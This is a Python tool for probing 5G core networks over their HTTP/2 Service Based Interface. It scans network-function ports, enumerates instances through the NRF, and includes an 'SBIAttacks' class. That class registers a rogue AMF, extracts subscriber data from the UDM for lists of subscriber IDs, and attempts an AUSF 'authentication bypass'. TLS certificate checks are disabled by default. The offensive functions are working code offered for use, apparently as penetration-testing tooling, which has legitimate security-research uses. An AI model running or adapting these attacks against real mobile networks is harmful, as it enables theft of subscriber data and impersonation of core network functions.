#!/usr/bin/env python3
import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 
import asyncio
import ssl
import socket
import logging
import json
import time
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass, field
from enum import Enum

logger = logging.getLogger(__name__)

try:
    import h2.connection
    import h2.events
    import h2.config
    H2_AVAILABLE = True
except ImportError:
    H2_AVAILABLE = False
    logger.warning("h2 library not available. Install with: pip install h2")

class SBIService(Enum):
    NRF = ("nrf", 29500)
    UDM = ("udm", 29501)
    AMF = ("amf", 29502)
    SMF = ("smf", 29503)
    PCF = ("pcf", 29504)
    BSF = ("bsf", 29505)
    AUSF = ("ausf", 29518)
    UDR = ("udr", 29519)
    NSSF = ("nssf", 29531)
    
    def __init__(self, name: str, port: int):
        self._name = name
        self._port = port
    
    @property
    def default_port(self) -> int:
        return self._port

@dataclass
class HTTP2Response:
    status: int
    headers: Dict[str, str]
    body: bytes
    stream_id: int
    response_time: float
    error_details: List[str] = field(default_factory=list)

@dataclass
class SBIEndpoint:
    service: SBIService
    host: str
    port: int
    base_path: str = ""
    use_tls: bool = True
    
    @property
    def url(self) -> str:
        scheme = "https" if self.use_tls else "http"
        return f"{scheme}://{self.host}:{self.port}{self.base_path}"

SBI_ENDPOINTS = {
    "nrf_discovery": "/nnrf-disc/v1/nf-instances",
    "nrf_management": "/nnrf-nfm/v1/nf-instances",
    "udm_sdm": "/nudm-sdm/v2/",
    "udm_uecm": "/nudm-uecm/v1/",
    "amf_comm": "/namf-comm/v1/",
    "amf_evts": "/namf-evts/v1/",
    "smf_pdusession": "/nsmf-pdusession/v1/",
    "pcf_policy": "/npcf-smpolicycontrol/v1/",
    "ausf_auth": "/nausf-auth/v1/",
    "udr_dr": "/nudr-dr/v2/",
}

class HTTP2Client:
    def __init__(
        self,
        host: str,
        port: int,
        use_tls: bool = True,
        timeout: float = 10.0,
        verify_ssl: bool = False
    ):
        self.host = host
        self.port = port
        self.use_tls = use_tls
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        
        self._socket: Optional[socket.socket] = None
        self._ssl_socket: Optional[ssl.SSLSocket] = None
        self._conn: Optional[Any] = None
        self._connected = False
        self._stream_id = 1
        self._responses: Dict[int, HTTP2Response] = {}
        self._pending_data: Dict[int, bytes] = {}
    
    def connect(self) -> bool:
        if not H2_AVAILABLE:
            logger.error("h2 library not available")
            return False
        
        try:
            self._socket = socket.create_connection(
                (self.host, self.port),
                timeout=self.timeout
            )
            
            if self.use_tls:
                ctx = ssl.create_default_context()
                if not self.verify_ssl:
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                ctx.set_alpn_protocols(['h2'])
                
                self._ssl_socket = ctx.wrap_socket(
                    self._socket,
                    server_hostname=self.host
                )
                
                negotiated = self._ssl_socket.selected_alpn_protocol()
                if negotiated != 'h2':
                    logger.warning(f"ALPN negotiated {negotiated}, expected h2")
                
                self._active_socket = self._ssl_socket
            else:
                self._active_socket = self._socket
            
            config = h2.config.H2Configuration(client_side=True)
            conn = h2.connection.H2Connection(config=config)
            conn.initiate_connection()
            self._active_socket.sendall(conn.data_to_send())
            self._conn = conn
            
            self._connected = True
            logger.info(f"HTTP/2 connected to {self.host}:{self.port}")
            return True
            
        except Exception as e:
            logger.error(f"HTTP/2 connection failed: {e}")
            self.close()
            return False
    
    def close(self):
        if self._conn and self._connected:
            try:
                self._conn.close_connection()
                if hasattr(self, '_active_socket') and self._active_socket:
                    self._active_socket.sendall(self._conn.data_to_send())
            except:
                pass
        
        if self._ssl_socket:
            try:
                self._ssl_socket.close()
            except:
                pass
        
        if self._socket:
            try:
                self._socket.close()
            except:
                pass
        
        self._connected = False
    
    def _get_next_stream_id(self) -> int:
        stream_id = self._stream_id
        self._stream_id += 2
        return stream_id
    
    def request(
        self,
        method: str,
        path: str,
        headers: Optional[Dict[str, str]] = None,
        body: Optional[bytes] = None
    ) -> Optional[HTTP2Response]:
        if not self._connected or self._conn is None:
            if not self.connect():
                return None
        
        if self._conn is None or not hasattr(self, '_active_socket'):
            return None
        
        conn = self._conn
        active_socket = self._active_socket
        
        start_time = time.time()
        stream_id = self._get_next_stream_id()
        
        request_headers = [
            (':method', method),
            (':path', path),
            (':scheme', 'https' if self.use_tls else 'http'),
            (':authority', f"{self.host}:{self.port}"),
            ('accept', 'application/json'),
            ('content-type', 'application/json'),
        ]
        
        if headers:
            for key, value in headers.items():
                request_headers.append((key.lower(), value))
        
        if body:
            request_headers.append(('content-length', str(len(body))))
        
        try:
            conn.send_headers(stream_id, request_headers, end_stream=(body is None))
            
            if body:
                conn.send_data(stream_id, body, end_stream=True)
            
            active_socket.sendall(conn.data_to_send())
            
            response_headers: Dict[str, str] = {}
            response_body = b""
            response_complete = False
            
            while not response_complete:
                active_socket.settimeout(self.timeout)
                data = active_socket.recv(65535)
                
                if not data:
                    break
                
                events = conn.receive_data(data)
                
                for event in events:
                    if H2_AVAILABLE and isinstance(event, h2.events.ResponseReceived):
                        if event.stream_id == stream_id:
                            for name, value in event.headers:
                                if isinstance(name, bytes):
                                    name = name.decode('utf-8')
                                if isinstance(value, bytes):
                                    value = value.decode('utf-8')
                                response_headers[name] = value
                    
                    elif H2_AVAILABLE and isinstance(event, h2.events.DataReceived):
                        if event.stream_id == stream_id:
                            response_body += event.data
                            conn.acknowledge_received_data(
                                event.flow_controlled_length,
                                event.stream_id
                            )
                    
                    elif H2_AVAILABLE and isinstance(event, h2.events.StreamEnded):
                        if event.stream_id == stream_id:
                            response_complete = True
                    
                    elif H2_AVAILABLE and isinstance(event, h2.events.StreamReset):
                        if event.stream_id == stream_id:
                            logger.warning(f"Stream {stream_id} reset: {event.error_code}")
                            response_complete = True
                
                active_socket.sendall(conn.data_to_send())
            
            status = int(response_headers.get(':status', '0'))
            response_time = time.time() - start_time
            
            return HTTP2Response(
                status=status,
                headers=response_headers,
                body=response_body,
                stream_id=stream_id,
                response_time=response_time
            )
            
        except Exception as e:
            logger.error(f"HTTP/2 request failed: {e}")
            return None
    
    def get(self, path: str, headers: Optional[Dict[str, str]] = None) -> Optional[HTTP2Response]:
        return self.request('GET', path, headers)
    
    def post(
        self,
        path: str,
        body: Optional[bytes] = None,
        json_data: Optional[Dict] = None,
        headers: Optional[Dict[str, str]] = None
    ) -> Optional[HTTP2Response]:
        if json_data:
            body = json.dumps(json_data).encode('utf-8')
        return self.request('POST', path, headers, body)
    
    def put(
        self,
        path: str,
        body: Optional[bytes] = None,
        json_data: Optional[Dict] = None,
        headers: Optional[Dict[str, str]] = None
    ) -> Optional[HTTP2Response]:
        if json_data:
            body = json.dumps(json_data).encode('utf-8')
        return self.request('PUT', path, headers, body)
    
    def delete(self, path: str, headers: Optional[Dict[str, str]] = None) -> Optional[HTTP2Response]:
        return self.request('DELETE', path, headers)

class SBIClient:
    def __init__(
        self,
        host: str,
        port: Optional[int] = None,
        service: Optional[SBIService] = None,
        use_tls: bool = True,
        timeout: float = 10.0
    ):
        if port is None and service:
            port = service.default_port
        elif port is None:
            port = 29500
        
        self.host = host
        self.port = port
        self.service = service
        self._client = HTTP2Client(host, port, use_tls, timeout)
    
    def connect(self) -> bool:
        return self._client.connect()
    
    def close(self):
        self._client.close()
    
    def __enter__(self):
        self.connect()
        return self
    
    def __exit__(self, exc_type, exc_val, exc_tb):
        self.close()
    
    def discover_nf_instances(
        self,
        target_nf_type: str,
        requester_nf_type: str = "AMF"
    ) -> Optional[Dict]:
        path = f"{SBI_ENDPOINTS['nrf_discovery']}?target-nf-type={target_nf_type}&requester-nf-type={requester_nf_type}"
        
        response = self._client.get(path)
        if response and response.status == 200:
            try:
                return json.loads(response.body)
            except:
                return {"raw": response.body.decode('utf-8', errors='ignore')}
        return None
    
    def register_nf_instance(
        self,
        nf_instance_id: str,
        nf_profile: Dict
    ) -> Optional[Dict]:
        path = f"{SBI_ENDPOINTS['nrf_management']}/{nf_instance_id}"
        
        response = self._client.put(path, json_data=nf_profile)
        if response and response.status in (200, 201):
            try:
                return json.loads(response.body)
            except:
                return {"status": response.status}
        return None
    
    def get_subscriber_data(
        self,
        supi: str,
        data_type: str = "am-data"
    ) -> Optional[Dict]:
        path = f"{SBI_ENDPOINTS['udm_sdm']}{supi}/{data_type}"
        
        response = self._client.get(path)
        if response and response.status == 200:
            try:
                return json.loads(response.body)
            except:
                return {"raw": response.body.decode('utf-8', errors='ignore')}
        return None
    
    def authenticate_ue(
        self,
        supi: str,
        serving_network_name: str
    ) -> Optional[Dict]:
        path = f"{SBI_ENDPOINTS['ausf_auth']}ue-authentications"
        
        auth_info = {
            "supiOrSuci": supi,
            "servingNetworkName": serving_network_name,
            "resynchronizationInfo": None
        }
        
        response = self._client.post(path, json_data=auth_info)
        if response and response.status in (200, 201):
            try:
                return json.loads(response.body)
            except:
                return {"status": response.status}
        return None
    
    def create_sm_context(
        self,
        pdu_session_id: int,
        dnn: str,
        s_nssai: Dict
    ) -> Optional[Dict]:
        path = f"{SBI_ENDPOINTS['smf_pdusession']}sm-contexts"
        
        sm_context = {
            "pduSessionId": pdu_session_id,
            "dnn": dnn,
            "sNssai": s_nssai
        }
        
        response = self._client.post(path, json_data=sm_context)
        if response and response.status in (200, 201):
            try:
                return json.loads(response.body)
            except:
                return {"status": response.status}
        return None

class SBIScanner:
    def __init__(
        self,
        target_host: str,
        timeout: float = 5.0
    ):
        self.target_host = target_host
        self.timeout = timeout
        self.discovered_services: List[Dict] = []
    
    def scan_sbi_ports(self) -> List[Dict]:
        self.discovered_services = []
        
        for service in SBIService:
            port = service.default_port
            logger.info(f"Probing {service.name} on port {port}...")
            
            for use_tls in [True, False]:
                try:
                    client = HTTP2Client(
                        self.target_host,
                        port,
                        use_tls=use_tls,
                        timeout=self.timeout
                    )
                    
                    if client.connect():
                        response = client.get("/")
                        client.close()
                        
                        self.discovered_services.append({
                            "service": service.name,
                            "port": port,
                            "tls": use_tls,
                            "status": response.status if response else 0,
                            "response_time": response.response_time if response else 0
                        })
                        
                        logger.info(f"  Found {service.name} (TLS={use_tls})")
                        break
                except Exception as e:
                    logger.debug(f"  Probe failed: {e}")
        
        return self.discovered_services
    
    def enumerate_nf_instances(self) -> List[Dict]:
        nf_instances = []
        
        try:
            with SBIClient(self.target_host, service=SBIService.NRF) as client:
                for nf_type in ["AMF", "SMF", "UPF", "UDM", "AUSF", "PCF", "BSF", "UDR"]:
                    result = client.discover_nf_instances(nf_type)
                    if result:
                        nf_instances.append({
                            "nf_type": nf_type,
                            "instances": result
                        })
        except Exception as e:
            logger.error(f"NF enumeration failed: {e}")
        
        return nf_instances

class SBIAttacks:
    def __init__(self, target_host: str, target_port: int = 29500):
        self.target_host = target_host
        self.target_port = target_port
    
    def rogue_nf_registration(
        self,
        nf_type: str = "AMF",
        nf_instance_id: str = "rogue-amf-001"
    ) -> Optional[Dict]:
        rogue_profile = {
            "nfInstanceId": nf_instance_id,
            "nfType": nf_type,
            "nfStatus": "REGISTERED",
            "heartBeatTimer": 60,
            "plmnList": [{"mcc": "001", "mnc": "01"}],
            "sNssais": [{"sst": 1, "sd": "000001"}],
            "fqdn": f"rogue-{nf_type.lower()}.5gc.mnc001.mcc001.3gppnetwork.org",
            "ipv4Addresses": ["10.45.0.200"],
            "capacity": 100,
            "load": 0,
            "priority": 1
        }
        
        try:
            with SBIClient(self.target_host, self.target_port, service=SBIService.NRF) as client:
                return client.register_nf_instance(nf_instance_id, rogue_profile)
        except Exception as e:
            logger.error(f"Rogue NF registration failed: {e}")
            return None
    
    def subscriber_data_extraction(
        self,
        supi_list: List[str]
    ) -> List[Dict]:
        extracted = []
        
        try:
            with SBIClient(self.target_host, service=SBIService.UDM) as client:
                for supi in supi_list:
                    for data_type in ["am-data", "smf-select-data", "ue-context-in-smf-data"]:
                        result = client.get_subscriber_data(supi, data_type)
                        if result:
                            extracted.append({
                                "supi": supi,
                                "data_type": data_type,
                                "data": result
                            })
        except Exception as e:
            logger.error(f"Subscriber extraction failed: {e}")
        
        return extracted
    
    def authentication_bypass_attempt(
        self,
        supi: str,
        serving_network: str = "5G:mnc001.mcc001.3gppnetwork.org"
    ) -> Optional[Dict]:
        try:
            with SBIClient(self.target_host, service=SBIService.AUSF) as client:
                return client.authenticate_ue(supi, serving_network)
        except Exception as e:
            logger.error(f"Auth bypass attempt failed: {e}")
            return None

def test_http2_connection(host: str, port: int = 443) -> bool:
    if not H2_AVAILABLE:
        logger.error("h2 library not installed")
        return False
    
    client = HTTP2Client(host, port)
    success = client.connect()
    
    if success:
        response = client.get("/")
        client.close()
        
        if response:
            logger.info(f"HTTP/2 test successful: status={response.status}")
            return True
    
    return False

if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="HTTP/2 SBI Client")
    parser.add_argument("--host", "-H", required=True, help="Target host")
    parser.add_argument("--port", "-p", type=int, default=29500)
    parser.add_argument("--scan", "-s", action="store_true", help="Scan SBI ports")
    parser.add_argument("--discover", "-d", action="store_true", help="Discover NF instances")
    parser.add_argument("--test", "-t", action="store_true", help="Test connection")
    
    args = parser.parse_args()
    
    if args.test:
        test_http2_connection(args.host, args.port)
    elif args.scan:
        scanner = SBIScanner(args.host)
        results = scanner.scan_sbi_ports()
        print(f"\nDiscovered services: {json.dumps(results, indent=2)}")
    elif args.discover:
        scanner = SBIScanner(args.host)
        instances = scanner.enumerate_nf_instances()
        print(f"\nNF instances: {json.dumps(instances, indent=2)}")
    else:
        client = HTTP2Client(args.host, args.port)
        if client.connect():
            response = client.get("/")
            if response:
                print(f"Status: {response.status}")
                print(f"Headers: {response.headers}")
                print(f"Body: {response.body[:500]}")
            client.close()


async def async_sbi_request(host: str, port: int, path: str, timeout: float = 5.0) -> Tuple[int, bytes, float]:
    loop = asyncio.get_event_loop()
    client = HTTP2Client(host, port)
    
    def do_request() -> Tuple[int, bytes, float]:
        if not client.connect():
            return (0, b"", 0.0)
        try:
            resp = client.get(path)
            if resp:
                return (resp.status, resp.body, resp.response_time)
            return (0, b"", 0.0)
        finally:
            client.close()
    
    return await loop.run_in_executor(None, do_request)

